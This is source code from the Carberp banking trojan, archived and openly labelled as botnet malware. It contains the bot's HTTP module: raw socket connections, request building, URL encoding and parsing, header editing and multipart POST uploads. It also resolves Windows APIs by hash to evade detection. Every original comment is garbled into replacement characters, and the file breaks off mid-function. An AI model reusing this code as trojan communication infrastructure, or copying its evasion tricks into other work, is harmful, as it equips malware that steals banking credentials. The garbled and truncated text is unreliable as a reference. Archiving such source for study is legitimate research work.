/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */


#include <windows.h>


#include "Strings.h"
#include "Memory.h"
#include "BotClasses.h"
#include "GetApi.h"
#include "Utils.h"
#include "BotHTTP.h"
#include "HTTPConsts.h"
#include "StrConsts.h"


//#include "BotDebug.h"


//********************** ���������� ������� **********************************

namespace HTTPDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define HTTPDBG HTTPDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************

//---------------------------------------------------------------------------

PHTTPRequestRec HTTPCreateRequest(PCHAR URL)
{
	// ������� ��������� �������
	PHTTPRequestRec R = CreateStruct(THTTPRequestRec);
	R->Method = hmGET;

	if (URL != NULL)
	{
		PURLREC UR = CreateStruct(TURLREC);
		if (ParseURL(URL, UR, false))
		{
			// ��������� ���������
			R->Host = UR->Host;
			R->Path = UR->Path;
			R->Port = UR->Port;
			UR->Path = NULL;
			UR->Host = NULL;
		}

		ClearURL(UR);
		FreeStruct(UR);
    }

	if (R->Port == 0)
		R->Port = HTTPPort;

	return R;
}
//---------------------------------------------------------------------------

void HTTPFreeRequest(PHTTPRequestRec Request)
{
	// ������� ��������� �������
	if (Request == NULL)
		return;
	HTTPClearRequest(Request);
	FreeStruct(Request);
}
//---------------------------------------------------------------------------

void HTTPClearRequest(PHTTPRequestRec Request)
{
	// ������� ������� ��������� HTTP �������
	if (Request == NULL)
		return;

	Request->Method = hmUnknown;
	Request->ContentLength = 0;

	STR::Free2(Request->Host);
	STR::Free2(Request->Path);
	STR::Free2(Request->Referer);
	STR::Free2(Request->Accept);
	STR::Free2(Request->AcceptLanguage);
	STR::Free2(Request->ProxyConnection);
	STR::Free2(Request->UserAgent);
	STR::Free2(Request->Cookie);
	STR::Free2(Request->ContentType);
	STR::Free2(Request->Connection);
	if (Request->PostDataType == pdtUrlEncoded && Request->PostData != NULL)
	{
		STR::Free((PCHAR)Request->PostData);
		Request->PostData = NULL;
	}
	ClearStruct(*Request);
}
//----------------------------------------------------------------------------
void SetDefaultPort(PHTTPRequestRec R)
{
	// ������������� ���� �� ���������, ���� � ������� �� ����������
	if (R->Port == 0)
		R->Port = HTTPPort;
}

void SetParam(PCHAR &Attr, PCHAR Value)
{
	// ���������������� ��������. ���� �� �������
	if (Attr == NULL)
		Attr = STR::New(Value);
}

void HTTPInitializeRequest(PHTTPRequestRec Request)
{
	// ������� ��������� �� ��������� ���� ��������� ������� ������������ �������
	if (Request == NULL)
		return;

	if (Request->UserAgent == NULL)
	{
		DWORD BufSize = 1024;
		PCHAR Buf = STR::Alloc(BufSize);
		pObtainUserAgentString( 0, Buf, &BufSize);
		Request->UserAgent = STR::New(Buf);
		STR::Free(Buf);
	}

	SetDefaultPort(Request);
	SetParam(Request->Accept, DefaultAccept);
	SetParam(Request->AcceptLanguage, DefaultAcceptLanguage);
	SetParam(Request->Connection, HTTPConnectionClose);
	if (Request->Method == hmPOST)
	{
		// ������������� ��� ��������
		if (Request->ContentType == NULL)
		{
			if (Request->PostDataType == pdtUrlEncoded)
				Request->ContentType = STR::New(FormDataURLEncoded);
			else
			{
                PMultiPartData D = (PMultiPartData)Request->PostData;
				Request->ContentType = STR::New(2, FormDataMultiPart, D->Boundary);
            }
        }

		// ���������� ������ ���� ������
		if (Request->ContentLength == 0)
		{
			if (Request->PostDataType == pdtUrlEncoded)
				Request->ContentLength = StrCalcLength((PCHAR)Request->PostData);
			else
				Request->ContentLength = MultiPartData::Read((PMultiPartData)Request->PostData, NULL, NULL);
        }
	}
}

void HTTPSetRequestURL(PHTTPRequestRec Request, PCHAR URL)
{
	// ���������  ��������� ������� ������� �� ������

}
//---------------------------------------------------------------------------

void AddParam(PStrings S, PCHAR Name, PCHAR Value, bool Valid = true)
{
	// � ������ ���� Valid == true � �������� �� ����� NULL ���������
	// �������� � ������
	if (Valid && !STR::IsEmpty(Value))
		Strings::AddValue(S, Name, Value, ValueDelimeter);
}

PCHAR HTTPRequest::Build(PHTTPRequestRec Request)
{
	// ������� �������� ������ �������
	if (Request == NULL || STR::IsEmpty(Request->Host))
		return NULL;

    HTTPInitializeRequest(Request);

	 // �������� ������ ������ �������
	PCHAR Top = GetMethodStr(Request->Method);
	if (Top == NULL)
		return NULL;

	PStrings S = Strings::Create();


	StrConcat(Top, 4, " /", Request->Path, " ", HTTPProtocolVersion_1_1);
	Strings::Add(S, Top);
    STR::Free(Top);

	// ��������� ���������
	AddParam(S, ParamAccept, Request->Accept);
	AddParam(S, ParamUserAgent, Request->UserAgent);

	if (Request->UseRange)
	{
		// ��������� ��������� Range
		PCHAR Start = StrLongToString(Request->StartRange);
		PCHAR End = NULL;
		if (Request->EndRange != 0)
			End = StrLongToString(Request->EndRange);

        PCHAR Value = STR::New(4, "bytes=", Start, "-", End);

        AddParam(S, ParamRange, Value);

		STR::Free(Start);
		STR::Free(End);
		STR::Free(Value);
    }

	AddParam(S, ParamReferer, Request->Referer);
	AddParam(S, ParamHost, Request->Host);
	AddParam(S, ParamConnection, Request->Connection);
	if (Request->Method == hmPOST)
	{
		// ��������� ���������� � ���� ������
		AddParam(S, ParamContentType, Request->ContentType);
		PCHAR CL = StrLongToString(Request->ContentLength);
		AddParam(S, ParamContentLength, CL);
        STR::Free(CL);
	}

	// ��������� ����������� ������
	Strings::Add(S, "\r\n");

	PCHAR Result = Strings::GetText(S);
	Strings::Free(S);
	return Result;
}
//---------------------------------------------------------------------------

PCHAR GetMethodStr(THTTPMethod Kind)
{
 // �������� ������ ������ �� ������
	 switch (Kind) {
		case hmGET:
			return STR::New(HTTPMethodGET);
		case hmPOST:
			return STR::New(HTTPMethodPOST);
		case hmHEAD:
			return STR::New(HTTPMethodHEAD);
	 default:
	 	return NULL;
	 }
}

PCHAR URLEncode(PCHAR URL, DWORD URLSize)
{
	// ������� �������� URL ������
    DWORD Len;
	if (URLSize == 0)
		Len = StrCalcLength(URL);
	else
        Len = URLSize;

	if (Len == 0)
		return NULL;

	char Hex[] = "0123456789ABCDEF";

    // ����������� ��������� �����
	PCHAR Buf = STR::Alloc(Len*3);
	if ( Buf == NULL )
		return NULL;


	PCHAR p = URL;
	PCHAR r = Buf;
	DWORD Pos = 0;
	DWORD ResLen = 0;
//	char Code;

	typedef int ( WINAPI *fwsprintfA )(PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );


    // �������� ������
	while (Pos < Len)
	{
		if (*p == 0)
		{
			*(r++) = 0;
			ResLen++;
            continue;
        }
		if ( ( *p >= 'A' && *p <= 'Z' ) ||
			 ( *p >= 'a' && *p <= 'z' ) ||
			 ( *p >= '0' && *p <= '9' ) )
		{
			*(r++) = *p;
			ResLen++;
		}
		else
		{
			*(r++) = '%';
			_pwsprintfA(r++, "%02X", (BYTE)*p);
			r++;
			ResLen += 3;
//			Code = (*p >> 4);
//			Code = Code  & 0x0F;
//			*(r++) = Hex[Code];
//			Code = *p & 0xF;
//			*(r++) = Hex[Code];
		}

		p ++;
		Pos++;
    }

	// ���������� ������ �� ������������ ������� ������
	PCHAR Res = STR::New(Buf, ResLen);
    STR::Free(Buf);
	return Res;
}
//-----------------------------------------------------------------------------



DWORD DoURLDecode(const char *URL, char* Buf)
{
	DWORD Len = 0;
	if (!STRA::IsEmpty(URL))
	{
		char HEX[3];
		HEX[2] = 0;
		for (; *URL != 0; URL++, Len++)
		{
			char C = *URL;
			if (C == '%')
			{
				URL++;
				if (Buf)
				{
					// �������������� ������
					HEX[0] = URL[0];
					HEX[1] = URL[1];
					C = LOBYTE(STR::HexToDWORD(HEX));
				}
				URL++;
			}

			// ���������� ���������� ������
			if (Buf)
			{
				*Buf = C;
				Buf++;
			}
		}
	}
	if (Buf) *Buf = 0;
	return Len;
}


//------------------------------------------------
//  URLDecode - ������� ���������� URL
//              ������������ ������
//------------------------------------------------
string URLDecode(const char *URL)
{
	DWORD BufSize = DoURLDecode(URL, NULL);
	string Result;
	Result.SetLength(BufSize);
	DoURLDecode(URL, Result.t_str());
	return Result;
}
//-----------------------------------------------------------------------------

// ������� ������ ���� �� ������� ������� � ������� ��������� �� ����
#define IncStrEx(S) if(S != NULL){*S = 0; S++;}


bool ParseURL(PCHAR URL, PURLREC Rec, bool FullPars)
{
	if (URL == NULL || Rec == NULL)
		return false;

	PCHAR Buf;

	// ���������� ��������
	Rec->Protocol = STR::GetLeftStr(URL, "://");

	// ������ ��������� �����
	if (Rec->Protocol != NULL)
	{
		Buf = STR::GetRightStr(URL, "://");
		if (Buf == NULL)
			return false;
    }
	else
		Buf = STR::New(URL);

	// ���������� ��������� �� ������ �����
	PCHAR PathPtr = STR::Scan(Buf, '/');
	IncStrEx(PathPtr);

	// ������ ����������
	PCHAR ArgsPtr = NULL;
	PCHAR DocPtr = NULL;
	if (FullPars)
	{
		ArgsPtr = STR::Scan(PathPtr, '?');
		IncStrEx(ArgsPtr);

		// ���������� ��������
		DocPtr = STR::ScanEnd(PathPtr, '/'); // ���� ��������� ����
		if (DocPtr == NULL)
		{
			// ���� �������� ����������
			DocPtr = PathPtr;
            PathPtr = NULL;
		}
		else
        	IncStrEx(DocPtr);
	}

	// ������ ����� � �����
	PCHAR HostPtr = Buf;
	PCHAR PortPtr = STR::Scan(HostPtr, ':');
	IncStrEx(PortPtr);

	// �������� ������
	Rec->Host      = STR::New(HostPtr);
	Rec->Path      = STR::New(PathPtr);
	Rec->Document  = STR::New(DocPtr);
	Rec->Port      = StrToInt(PortPtr);
	Rec->Arguments = STR::New(ArgsPtr);


	STR::Free(Buf);
	return true;
}

void ClearURL(PURLREC URL)
{
	if (URL == NULL)
		return;

	STR::Free2(URL->Protocol);
	STR::Free2(URL->Host);
	STR::Free2(URL->Path);
	STR::Free2(URL->Document);
	STR::Free2(URL->Arguments);
	STR::Free2(URL->UserName);
	STR::Free2(URL->Password);
	URL->Port = 0;
}

void AddURLParam(PStrings S, PCHAR Name, PCHAR Value, DWORD ValueSize)
{
	if (S == NULL || Name == NULL)
		return;

	PCHAR NewValue = URLEncode(Value, ValueSize);
	Strings::AddValue(S, Name, NewValue);
	STR::Free(NewValue);
}

//----------------------------------------------------------------------------
//  ������� ��� �������� �������
//----------------------------------------------------------------------------


bool InitializeWSA()
{
	// �������������� ����������
	WSADATA wsa;
	ClearStruct(wsa);
	DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
	return Code == 0;
}

SOCKET ConnectToHost(PCHAR Host, int Port)
{
	// ������������ � �����

	// �������������� ����������
	if (!InitializeWSA())
		return INVALID_SOCKET;

	// ��������  ����� �� ����� �����
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname((const char*)Host);

	if ( lpHost == NULL )
		return SOCKET_ERROR;

	// ��������� ����
	SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);

	if( Socket == SOCKET_ERROR )
		return Socket;

	struct sockaddr_in SockAddr;

	ClearStruct(SockAddr);

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = HTONS((unsigned short)Port );

	// ������������ � ������
	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		//int Error = WSAGetLastError();
		pclosesocket( Socket );
		return SOCKET_ERROR;
	}
	return Socket;
}


SOCKET ConnectToHostEx(const char* Host, int Port, DWORD TimeoutSec)
{
	// ������������ � �����

	SOCKET Socket = INVALID_SOCKET;

	// �������������� ����������
	if (!InitializeWSA())
		return Socket;


	do
	{
		// ��������  ����� �� ����� �����
		LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname(Host);

		// �� ����� ���
		if ( lpHost == NULL ) break;

		Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, IPPROTO_TCP);

		// ����� �� ��������
		if( Socket == INVALID_SOCKET ) break;

		// �������� ������������� �����
		u_long nonblocking_enabled = 1;
		int ioct_result = (int)pioctlsocket(Socket, FIONBIO, &nonblocking_enabled);

		// �� ���������� ������� ������������� �����
		if (ioct_result != NO_ERROR) break;

		struct sockaddr_in SockAddr;

		SockAddr.sin_family		 = AF_INET;
		SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
		SockAddr.sin_port		 = HTONS((unsigned short)Port );

		// ������������ � ������

		int   connect_result = (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) );
		DWORD last_error = (DWORD)pWSAGetLastError();

		// �-��� ������� ���������� ������� � ������������� ������
		if (connect_result != SOCKET_ERROR) break;

		// ������ �� ������� � ������������� �������
		if (last_error !=  WSAEWOULDBLOCK) break;

		fd_set writefds;
		fd_set readfds;
		fd_set excptfds;

		TIMEVAL tv;

		tv.tv_sec  = TimeoutSec;
		tv.tv_usec = 0;

		FD_ZERO(&writefds);
		FD_ZERO(&readfds);
		FD_ZERO(&excptfds);

		FD_SET(Socket, &writefds);
		FD_SET(Socket, &readfds);
		FD_SET(Socket, &excptfds);

		int select_result = (int)pselect(0, &readfds, &writefds, &excptfds, &tv);

		// ������ ��� ������ select
		if (select_result == SOCKET_ERROR) break;

		// ������ ��� ����������.
//		if (FD_ISSET(Socket, &excptfds) != 0) break;
		if (pWSAFDIsSet(Socket, &excptfds) != 0) break;

		// ������ �� ����, �� � ����������� �� �����.
//		if (FD_ISSET(Socket, &writefds) == 0) break;
		if (pWSAFDIsSet(Socket, &writefds) == 0) break;

		// ��� ���������� ��� ����� �����������.
		return Socket;
	}
	while (0);

	if (Socket != INVALID_SOCKET) pclosesocket( Socket );
	return SOCKET_ERROR;
}

//----------------------------------------------------------------------------

bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
{
    // ��������� ������ �� ������
	PMemBlockList HeaderBuf = MEMBLOCK::CreateList();

	if (HeaderBuf == NULL)
		return false;

	DWORD DataSize = 4096;
	LPBYTE Data = (LPBYTE)HEAP::Alloc(DataSize);
	int Size = 9;

	bool Completed = false;
    int DelPos;
	// �������� ��������� ������
	LPBYTE PartBuf = NULL;
	int PartSize = 0;

 	while (!Completed)
	{
		//
		Size = (int)precv(Sock, (char*)Data, DataSize, 0);
		if (Size <= 0)
			break;

		// ���������� ������� �����������
		DelPos = STR::Pos((PCHAR)Data, LineBreak2);
		if (DelPos >= 0)
		{
		   // ����������� ��������� ������
		   Completed = true;
		   PartBuf = Data;
		   DWORD L = StrCalcLength(LineBreak2);
		   PartBuf = (LPBYTE)((DWORD)PartBuf+ DelPos + L);
		   PartSize = Size - DelPos - L;

		   Size = DelPos;
		}

		MEMBLOCK::AddBlock(HeaderBuf, Data, Size);
	}

	Header = MEMBLOCK::BuildAsStr(HeaderBuf, &Len);

	MEMBLOCK::FreeList(HeaderBuf);

	if (Buf == NULL)
	{
		HEAP::Free(Data);
		return true;
    }


	// ������������ ���������

    PChunks Chunks = Chunks::Initialize(Header);

    //----------------------------------------

	PMemBlockList RecBuf = MEMBLOCK::CreateList();

	if (RecBuf == NULL)
		return false;

	// ���������� ������� �����

	if (PartSize > 0)
		MEMBLOCK::AddBlock(RecBuf, PartBuf, PartSize);

	// �������� ��������
	do
	{
		Size = (int)precv(Sock, (char*)Data, DataSize, 0);
		if (Size <= 0)
			break;

		MEMBLOCK::AddBlock(RecBuf, Data, Size);
	}
	while (1);

	*Buf = MEMBLOCK::BuildAsStr(RecBuf, &Len);
	MEMBLOCK::FreeList(RecBuf);
	HEAP::Free(Data);

    bool Result = true;

    // ��������� ��������� ��������
	if (Chunks != NULL)
	{
		Chunks::HandleDataBlock(Chunks, (LPBYTE)*Buf, Len);
        STR::UpdateLength(*Buf, Len);
		Result = Chunks->Completed;
		Chunks::Free(Chunks);
    }

	return Result;
}
//-------------------------------------------------------------------------

int SendData(SOCKET Socket, LPVOID Buf, DWORD Size)
{
	// ������� ������ ������ � �����
	#ifdef HTTPDebugH
    HTTPDebug::Write(Buf, Size);
	#endif

	return (int)psend(Socket, (char*)Buf, Size, 0);
}
//-------------------------------------------------------------------------

void HTTPSendPostData(PHTTPRequestRec Request, SOCKET Socket)
{
	// ��������� ���� ������ � �����
	if (Request->PostData == NULL)
		return;

	if (Request->PostDataType == pdtUrlEncoded)
	{
		// ���������� URL Encoded ������
		SendData(Socket, Request->PostData, Request->ContentLength);
		return;
	}

	// ���������� MultiPartData
	PMultiPartData D = (PMultiPartData)Request->PostData;
	DWORD BufSize = 4096;
	DWORD Readed;
	LPBYTE Buffer = (LPBYTE)MemAlloc(BufSize);
	if (Buffer == NULL)
		return;

	int Sended = 0;
	do
	{
		Readed = MultiPartData::Read(D, Buffer, BufSize);
		if (Readed != 0)
			Sended += SendData(Socket, Buffer, Readed);
	}
	while (Readed != 0);

	MemFree(Buffer);
}

bool HTTP::ExecuteMethod(PHTTPRequestRec Request, HTTP::PResponseData Response)
{
	// ������� ��������� HTTP ����� ��������� � ���������� �������
	if (Request == NULL || Request->Host == NULL)
		return false;

	// ������� ������ ������
	if (Response != NULL)
	{
		if (Response->Buffer != NULL) *Response->Buffer = NULL;
		if (Response->Size != NULL) *Response->Size = 0;
		if (Response->Headers != NULL) *Response->Headers = NULL;
	}

	
	SetDefaultPort(Request);

	// ������������ � �����
	SOCKET Sock = ConnectToHost(Request->Host, Request->Port);
	if (Sock == SOCKET_ERROR)
		return false;

	// ��������� ������
	PCHAR SendBuf = HTTPRequest::Build(Request);
	if (SendBuf == NULL)
	{
		pclosesocket(Sock);
		return false;
	}

	bool Result = true;
	DWORD BufSize = STR::Length(SendBuf);

	if (SendData(Sock, SendBuf, BufSize) != SOCKET_ERROR)
	{
        // ���������� ���� ������
		if (Request->Method == hmPOST)
		{
			// ��������� POST ������
			HTTPSendPostData(Request, Sock);
		}



		// ������ ����������, ������ �����
		if (Response)
		{
			DWORD Size = 0;
			PCHAR Headers = NULL;

			HTTPResponse::Clear(&Response->Response);

			ReceiveData(Sock, Headers, Response->Buffer, Size);

			// ��������� ����� ������
			HTTPResponse::Parse(Headers, &Response->Response);
			 

			//��������� ������ ��������� ������
			if (Response->Buffer && Response->Response.ContentLength &&
				STR::Length(*Response->Buffer) != Response->Response.ContentLength)
			{
				Result = false;
				STR::Free2(*Response->Buffer);
			}


			if (Response->Headers != NULL)
				*Response->Headers = Headers;
			else
				STR::Free(Headers);

			if (Response->Size != NULL)
				*Response->Size = Size;
		}
    }

	// ��������� ����
	pclosesocket(Sock);

	return Result;

}

bool HTTP::Get(PCHAR URL, PCHAR *Buf, PHTTPResponseRec Response)
{
	// ������� ���������� ���� �� ������ URL � ����� Buf
	if (URL == NULL)
		return false;

	PHTTPRequestRec R = HTTPCreateRequest(URL);

	TResponseData ResponseData;
	ClearStruct(ResponseData);
	ResponseData.Buffer = Buf;

	bool Res = HTTP::ExecuteMethod(R, &ResponseData);

	if (Response)
		*Response = ResponseData.Response;
	else
		HTTPResponse::Clear(&ResponseData.Response);

	HTTPFreeRequest(R);
	return Res;
}

bool HTTP::Post(PCHAR URL, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response)
{
	// ��������� ���� ������ �� ������
	if (URL == NULL || Fields == NULL)
		return false;

	PHTTPRequestRec R = HTTPCreateRequest(URL);
	R->Method = hmPOST;
	R->PostData = Strings::GetText(Fields, URLValueDelimeter);

	TResponseData ResponseData;
	ClearStruct(ResponseData);
	ResponseData.Buffer = Buf;

	bool Res = HTTP::ExecuteMethod(R, &ResponseData);

	if (Response)
		*Response = ResponseData.Response;
	else
		HTTPResponse::Clear(&ResponseData.Response);

	HTTPFreeRequest(R);
	return Res;
}


bool HTTP::Post(PCHAR URL, PMultiPartData Fields, PCHAR *Buf, PHTTPResponseRec Response)
{
	// ��������� ���� ������ �� ������
	if (URL == NULL || Fields == NULL)
		return false;

	PHTTPRequestRec R = HTTPCreateRequest(URL);
	R->Method = hmPOST;
	R->PostData = Fields;
	R->PostDataType = pdtMultipartFormData;

	TResponseData ResponseData;
	ClearStruct(ResponseData);
	ResponseData.Buffer = Buf;

	bool Res = HTTP::ExecuteMethod(R, &ResponseData);

	if (Response)
		*Response = ResponseData.Response;
	else
		HTTPResponse::Clear(&ResponseData.Response);

	HTTPFreeRequest(R);
	return Res;
}


//----------------------------------------------------------------------------

PCHAR GetEndLine(PCHAR Str)
{
	// ������� ���������� ��������� �� ��������� ������ ������
	if (Str == NULL)
		return NULL;

	PCHAR C = Str;

	while (*C != 0 && *C != 10 && *C != 13) C++;
    return C;
}

PCHAR ScanLN(PCHAR S, char C, bool SetAfter = false)
{
	// ������� ���� ������ �� ����� ������
	if (S == NULL)
		return NULL;
	PCHAR T = S;
	while ((*T != 0) && (*T != 10) && (*T != 13) && (*T != C)) T++;
	if (*T == C)
	{
		if (SetAfter)
            T++;
		return T;
	}
	else
		return NULL;
}

void IgnoreSpaces(PCHAR &S)
{
    // ������������ �������
	if (S == NULL)
		return;
	while (*S != 0 && *S == ' ') S++;
}

PCHAR GetStrFromPtr(PCHAR Start, PCHAR End)
{
	// �������� ������ ����� �����������
	if (Start == NULL || End == NULL)
		return NULL;
	int Len = End - Start;
	if (Len <= 0)
		return NULL;
	return STR::New(Start, Len);
}

bool IsKnownHTTPMethod(PCHAR Method)
{

	int Index = StrIndexOf(Method, true, 11, HTTPMethodGET,
											HTTPMethodPOST,
											HTTPMethodHEAD,
											HTTPMethodPUT,
											HTTPMethodDELETE,
											HTTPMethodLINK,
											HTTPMethodUNLINK,
											HTTPMethodCONNECT,
											HTTPMethodOPTIONS,
											HTTPMethodPATCH,
                                            HTTPMethodTRACE);
	return Index >= 0;
}


#define ClearStrVar(S) if (S != NULL) *S = NULL


// ������ ������� HTTP ����������
bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVersion)
{
	// ��������� ������ ������ �������
	ClearStrVar(Method);
	ClearStrVar(Path);
	ClearStrVar(ProtVersion);

	if (Line == NULL)
		return false;

	// ���������� ��������� �� ���� � ��������
	PCHAR MethodPtr = ScanLN(Line, ' ');
	PCHAR PathPtr = ScanLN(MethodPtr, '/', true);
	PCHAR ProtPtr = ScanLN(PathPtr, ' ');
	PCHAR EndL = GetEndLine(ProtPtr);

	if (MethodPtr == NULL ||  PathPtr == NULL || ProtPtr == NULL)
		return false;


	PCHAR MethodName = GetStrFromPtr(Line, MethodPtr);
	if (!IsKnownHTTPMethod(MethodName))
	{
		// ����������� ����� �������
		STR::Free(MethodName);
		return false;
    }

	// �������� �����
	if (Method != NULL)
		*Method = MethodName;
	else
		STR::Free(MethodName);

	// �������� ����
	if (Path != NULL)
		*Path = GetStrFromPtr(PathPtr, ProtPtr);

	// �������� ��������
	if (ProtVersion != NULL)
	{
		IgnoreSpaces(ProtPtr);
		*ProtVersion = GetStrFromPtr(ProtPtr, EndL);
    }

	// ���������� ����� ���� �������� ��������� �� 3 �����
	return true;
}

THTTPMethod GetMethodFromStr(PCHAR Method)
{
	// ������� ���������� ��� ������ �� ��� ��������
	switch (StrIndexOf(Method, false, 3, HTTPMethodGET, HTTPMethodPOST, HTTPMethodHEAD)) 
	{
		case 0:
			return hmGET;
		case 1:
			return hmPOST;
		case 2:
			return hmHEAD;	
        
    default:
    	return hmUnknown;
	} 
}

PCHAR HTTPParser::GetHeaderValue(PCHAR Buf, PCHAR Name)
{
	// ������� ���������� �������� ���������
	if (Buf == NULL || Name == NULL)
		return NULL;
		
	DWORD Len = StrCalcLength(Name);
	PCHAR Line = Buf; // ��������� �� ������ ������
	PCHAR EndLN;      // ��������� �� ����� ������
	PCHAR ValPTR;     // ��������� �� ����������� ':'
	
	DWORD LBCount; // ���������� �������� ���������� �����
	
	// ��������� ���������� �����
	while (*Line != 0)
	{
  		IgnoreSpaces(Line);
		EndLN = GetEndLine(Line);
		// ���� ������� �����������
		
		ValPTR = ScanLN(Line, ':', true);
		if (ValPTR != NULL && StrSame(Line, Name, false, Len)) 
		{
			// ����� ���������� �����
			IgnoreSpaces(ValPTR);
			return GetStrFromPtr(ValPTR, EndLN);
		}

		// ��������� �� ��������� �������
		LBCount = 1;
		Line = EndLN;
		while (*Line != 0 && (*Line == 10 || *Line == 13)) 
		{
			Line++;
			LBCount++;
		}

		// ���� ��������� 4 � ������ �����������(����� ���������) ��
		// ��������� ����
		if (LBCount >= 4) break;
			
	}
	return NULL;			
}



bool HTTPParser::SetHeaderValue(PCHAR Buf, DWORD BufSize, DWORD MaxBufSize, PCHAR Header, PCHAR Value,  DWORD *NewBufSize)
{
	// ���������� �������� ���������
	if (STR::IsEmpty(Buf) || STR::IsEmpty(Header))
		return false;

	// ���������� ��������� ���������
	int Pos = STR::Pos(Buf, Header, BufSize, false);

	if (Pos < 0)
	{
		// ��������� �����������, ��������� ���
		Pos = STR::Pos(Buf, LineBreak2, BufSize);
		bool ContainHeaders = Pos >= 0;


		PCHAR End = (ContainHeaders)? Buf + Pos : STR::End(Buf);

        *End = 0;

        PCHAR LB = (ContainHeaders)? LineBreak2 : NULL;
		PCHAR Line = STR::New(5, LineBreak, Header, ": ", Value, LB);

		bool  Result = false;
		if ((End - Buf) + STR::Length(Line) <= MaxBufSize)
		{
			m_memcpy(End, Line, STR::Length(Line));
			Result = true;
        }

		STR::Free(LB);

		return Result;
    }


	PCHAR Tmp = Buf + Pos + StrCalcLength(Header);

	while ((*Tmp != 0) && (*Tmp == ' ' || *Tmp == ':' )) Tmp++;
	PCHAR StartPtr = STR::New(Buf, DWORD(Tmp - Buf));


	// ���������� ����� ������
	while ((*Tmp != 0) && *Tmp != '\r' && *Tmp != '\n' ) Tmp++;

	PCHAR EndPtr = Tmp;

	PCHAR ResBuf = STR::New(3, StartPtr, Value, EndPtr);
    DWORD ResLen = STR::Length(ResBuf);

	bool Result = false;
	if (MaxBufSize == 0 || ResLen <  MaxBufSize)
	{
		STR::Copy(ResBuf, Buf, 0, ResLen + 1);;
		if (NewBufSize != NULL)
			*NewBufSize = ResLen;
		Result = true;
    }

	STR::Free(ResBuf);
    STR::Free(StartPtr);
	return true;
}


//----------------------------------------------------------------------------
DWORD HTTPParser::DeleteHeader(PCHAR Header, PCHAR HTML, DWORD HTMLSize)
{
	// ������� ��������� �� HTML ���������. �������� ������ ���������
	// ����� HTTP �������
	if (STR::IsEmpty(Header) || STR::IsEmpty(HTML)) 
			return HTMLSize;

	// ���������� ����� ������ ���������
	if (HTMLSize == 0)
		HTMLSize = StrCalcLength(HTML);

	// ���������� ������� ����� ���������� ������ �������
	int HeadersSize = STR::Pos(HTML, LineBreak2, HTMLSize);
	if (HeadersSize <= 0) return HTMLSize;

	// ���� ������� ������� ���������
	int Start = STR::Pos(HTML, Header,  HeadersSize);
	if (Start < 0) return HTMLSize; // ��������� ���.

	// ���������� ����� ������ ���������
	PCHAR Tmp = HTML + Start;
	int End = Start;
	while (*Tmp != 10 && *Tmp != 13 && (DWORD(Tmp - HTML) <  HTMLSize))
	{
		Tmp++;
        End++;
	}
	End += 2; // ���������� \r\n

	// ������� ������ ���
	Tmp = HTML + End;
	STR::Copy(Tmp, HTML + Start, 0, HTMLSize - End);

	// ������ ����������� ����
	HTMLSize -= End - Start;

	Tmp = HTML + HTMLSize;
	*Tmp = 0;

	return HTMLSize;
}
//----------------------------------------------------------------------------

PCHAR GetURLEncodedPostData(PCHAR Buf)
{
	// �������� URL ������������ ���� ������.

	// ���������� ������� �������� ����������� ����� � �������� ������
	// �� ��������� ������

	int Pos = STR::Pos(Buf, LineBreak2);

	if (Pos < 0)
	   return NULL;

	Pos+=StrCalcLength(LineBreak2);

	PCHAR Start = Buf + Pos;
	PCHAR End = GetEndLine(Start);

	return GetStrFromPtr(Start, End);;
}

//***************************************************************************
//
//   ������ ��� ������ � ���� ������� ������� multy part form data
//
//***************************************************************************

// ������ ������ ������ MultiPartData
namespace MPDReader
{

	const static PCHAR BoundaryDelimeter = "--";
	const static PCHAR ContentTypeHeader = "Content-Type: ";
	const static PCHAR DefaultContentType = "application/octet-stream";
	const static PCHAR TransferEncodingHeader ="Content-Transfer-Encoding: binary";


	void MakeItemHeader(PMultiPartData Data, PMultiPartItem  Item)
	{
		// ������� ��������� ��������

		PCHAR Prefix = NULL;
		// ����� ������ ��������� ��������� Boundary
		if (List::GetItem(Data->Items, 0) == Item)
			Prefix = STR::New(3, BoundaryDelimeter, Data->Boundary, LineBreak);

		if (Item->FileName == NULL)
		{
			// ������� �������
			Item->Header = STR::New(5, Prefix, ContentDispositionName, Item->Name, "\"", LineBreak2);
            STR::Free(Prefix);
			return;
		}

		PCHAR ShortName = File::ExtractFileNameA(Item->FileName, false);
		PCHAR CT = Item->ContentType;
		if (CT == NULL)
			CT = DefaultContentType;

		// �������� ��������� �������� �����
		Item->Header = STR::New(13,
			Prefix,
			ContentDispositionName, Item->Name, "\"",
			FileNameHeader, ShortName,  "\"", LineBreak,
			ContentTypeHeader, CT, LineBreak,
			TransferEncodingHeader, LineBreak2);

		STR::Free(Prefix);
    }

	// �������� ������
	void CopyData(LPVOID Data, DWORD DataSize, LPBYTE &Buffer, DWORD &BufSize)
	{
		m_memcpy(Buffer, Data, DataSize);
		Buffer += DataSize;
		BufSize -= DataSize;
    }

	//-----------------------------------------------------------------------

	DWORD ReadItem(PMultiPartData Data, PMultiPartItem  Item, LPBYTE Buffer, DWORD Size, bool IsLastItem)
	{
		// ������ ������ ��������
		if (Item == NULL)
			return 0;

		if (STR::IsEmpty(Item->Header))
			MakeItemHeader(Data, Item);

		DWORD Result = 0;

		// ���������� ������ ������ ��������
		if (Buffer == NULL)
		{
